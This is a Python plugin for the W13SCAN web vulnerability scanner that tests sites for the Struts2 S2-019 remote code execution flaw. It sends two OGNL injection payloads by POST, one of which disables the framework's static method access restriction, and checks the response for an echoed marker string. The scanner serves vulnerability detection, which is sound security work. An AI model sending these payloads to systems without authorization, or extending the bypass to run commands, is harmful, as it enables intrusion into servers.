# coding   :utf-8
# file     : struts2_019.py
# author   : go0p
# time     : 2019/8/18 1:53 PM
# software :PyCharm

import copy
import os
import requests

from W13SCAN.lib.common import prepare_url
from W13SCAN.lib.const import acceptedExt, ignoreParams, Level
from W13SCAN.lib.output import out
from W13SCAN.lib.plugins import PluginBase


class W13SCAN(PluginBase):
    name = 'Struts2-019远程代码执行'
    desc = ''''''
    level = Level.HIGHT

    def audit(self):
        method = self.requests.command  # 请求方式 GET or POST
        version = self.requests.request_version  # HTTP 0.9/1.0/1.1
        headers = self.requests.get_headers()  # 请求头 dict类型
        url = self.build_url()  # 请求完整URL
        resp_data = self.response.get_body_data()  # 返回数据 byte类型
        resp_str = self.response.get_body_str()  # 返回数据 str类型 自动解码
        resp_headers = self.response.get_headers()  # 返回头 dict类型

        p = self.requests.urlparse
        params = self.requests.params
        netloc = self.requests.netloc

        if self.response.language and self.response.language != "JAVA":
            return

        if method == 'GET':
            exi = os.path.splitext(p.path)[1]
            if exi not in acceptedExt:
                return

            check = '<Struts2-vuln-Check>'
            payloads = [
                r'''debug=command&expression=#req=#context.get('com.opensymphony.xwork2.dispatcher.HttpServletRequest'),#a=#req.getSession(),#b=#a.getServletContext(),#c=#b.getRealPath("<Struts2-vuln-"),#matt=%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse')%2C#matt.getWriter().print(#c),#matt.getWriter().print('Check>'),#matt.getWriter().flush(),#matt.getWriter().close()''',
                r'''debug=command&expression=%23f%3d%23_memberAccess.getClass%28%29.getDeclaredField%28%27allowStaticMethodAccess%27%29%2c%23f.setAccessible%28true%29%2c%23f.set%28%23_memberAccess%2ctrue%29%2c%23resp%3d%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27%29%2c%23resp.getWriter%28%29.println%28%27<Struts2-vuln%27%2b%27-Check>%27%29%2c%23resp.getWriter%28%29.flush%28%29%2c%23resp.getWriter%28%29.close%28%29'''
            ]
            if "cookie" in headers.keys():
                headers.pop('cookie')
            headers['Content-Type'] = 'application/x-www-form-urlencoded'
            for payload in payloads:
                r = requests.post(url, headers=headers,data=payload)
                html1 = r.text
                if check in html1:
                    out.success(url, self.name, playload="{}".format(payload), method="POST", check=check,
                                raw=r.raw)
                    break
